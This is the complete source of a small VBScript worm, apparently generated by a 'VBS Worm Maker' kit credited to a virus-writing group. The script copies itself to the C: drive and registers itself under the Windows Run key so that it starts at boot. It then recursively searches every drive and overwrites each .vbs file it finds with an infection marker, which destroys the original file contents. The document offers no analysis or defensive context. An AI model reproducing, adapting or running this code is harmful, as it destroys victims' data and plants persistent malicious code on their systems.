on error resume next
Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set Fso=createobject("scripting.filesystemobject") 
Set w = fso.GetFile(WScript.ScriptFullName)
w.Copy ("C:\acookie.vbs")
Set vrc2 = CreateObject( "WScript.Shell" )
vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "VxBioLabs", ("C:\acookie.vbs")
Set Drives=fso.drives
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
'coded by ACIdCooKie / www.vxbiolabs.cjb.net
Function Dosearch(Path) 
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files 
If fso.GetExtensionName(file.path)="vbs" then 
Set Script = Fso.CreateTextFile(file.path, True)
Script.Writeline "'test3"
Script.Writeline "'This file infect by VBS Worm Maker / LittleBoy / www.vxbiolabs.cjb.net"
Script.Close
end If 
Next 
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function
'Author of LittleBoy is ACIDCOOKIE
'Name of this worm is: test3
'Author of this worm is: test3
